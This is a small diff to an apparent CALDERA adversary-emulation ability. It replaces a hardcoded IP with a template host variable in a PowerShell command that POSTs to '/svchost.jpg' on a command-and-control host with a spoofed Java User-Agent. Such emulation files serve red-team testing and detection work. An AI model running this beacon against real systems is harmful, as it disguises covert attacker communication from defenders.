@@ -10,7 +10,7 @@
   executors:
   - name: psh
     platform: windows
-    command: 'Invoke-WebRequest -Uri "http://198.18.133.49/svchost.jpg" ` -Method
+    command: 'Invoke-WebRequest -Uri "http://#{caldera.host}/svchost.jpg" ` -Method
       Post ` -Headers @{ "User-Agent" = "Java/1.7.0_80" } ` -Body "key=value" '
     code: null
     language: null
